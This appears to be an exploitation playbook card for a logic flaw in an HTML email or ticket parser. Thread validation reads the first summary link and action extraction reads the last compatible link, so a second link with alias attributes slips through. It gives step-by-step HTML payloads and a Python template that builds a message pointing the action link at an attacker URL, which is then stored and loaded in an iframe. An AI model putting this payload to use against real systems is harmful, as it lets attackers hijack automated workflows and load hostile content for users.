---
name: html_card_thread_vs_action_link_confusion
vuln_type: logic_flaw
sub_technique: action_link_confusion
category: exploitation
safety_level: safe
---

# Html Card Dual-Extraction — Thread Marker Uses First Link, Action Uses Last Compatible Link

## When to Apply

An HTML email/ticket body is parsed for two different purposes from the same container element: (1) `ExtractThreadMarker` picks the FIRST link with class `summary-link` for thread matching, while (2) `ExtractActionCard` picks the LAST link with any compatible class (`summary-link`, `message-link`, or `entry-link`) for the actual review/action link. This allows an attacker to include a legitimate first link that passes thread validation alongside a malicious second link that gets used as the action link. The container must have class `message-summary` or similar, and the links must have specific data attributes (data-mode, data-tags, data-thread-id).

## Prerequisites

- HTML parser extracts multiple links from the same container (<section>/<div>/<article>)
- Thread validation uses the first summary-link (ExtractThreadMarker)
- Action/review link extraction uses the last compatible link (ExtractActionCard)
- Container class matches: message-summary, message-panel, queue-summary, or data-layout=compact
- Links need data-mode='inline', data-tags='summary,activity,notes', matching data-thread-id

## Steps

1. Create a container: `<section class="message-summary" data-layout="compact">`
2. First link (passes thread validation):
   `<a class="summary-link" href="https://legit.domain/notes/safe" data-mode="inline" data-tags="summary, activity, notes" data-thread-id="THREAD_KEY">review summary</a>`
3. Second link (malicious action link):
   `<a class="entry-link" href="ATTACKER_URL" data-view="inline" data-sections="summary, activity, notes" data-record-id="THREAD_KEY">case handoff</a>`
4. Thread validation passes (first link matches expected thread)
5. Worker extracts action link from last compatible link (attacker URL)
6. Attacker URL gets stored in automation_context and loaded in iframe

## Code Template

```
def followup_html(callback_url, subject):\n    thread_key = '-'.join(subject.lower().split())\n    return (\n        '<section class="message-summary" data-layout="compact">'\n        '<a class="summary-link" href="https://legit/notes/safe" '\n        f'data-mode="inline" data-tags="summary, activity, notes" '\n        f'data-thread-id="{thread_key}">review</a>'\n        f'<a class="entry-link" href="{callback_url}" '\n        f'data-view="inline" data-sections="summary, activity, notes" '\n        f'data-record-id="{thread_key}">handoff</a>'\n        '</section>'\n    )
```

## Examples

### Example 1

- **first_link_class**: summary-link (used by ExtractThreadMarker — first link)
- **second_link_class**: entry-link (used by ExtractActionCard — last compatible link)
- **compat_classes**: summary-link, message-link, entry-link (all accepted by compatReferenceCardFromAttrs)
- **compat_attrs**: data-view/data-mode, data-sections/data-tags, data-record-id/data-thread-id (aliases)

The vulnerability is in the asymmetry between ExtractThreadMarker (returns cards[0]) and ExtractActionCard (returns cards[len(cards)-1]). The compat card extraction also accepts alias attributes: data-view for data-mode, data-sections for data-tags, data-record-id for data-thread-id. This makes it easy to construct a second link that passes all checks.
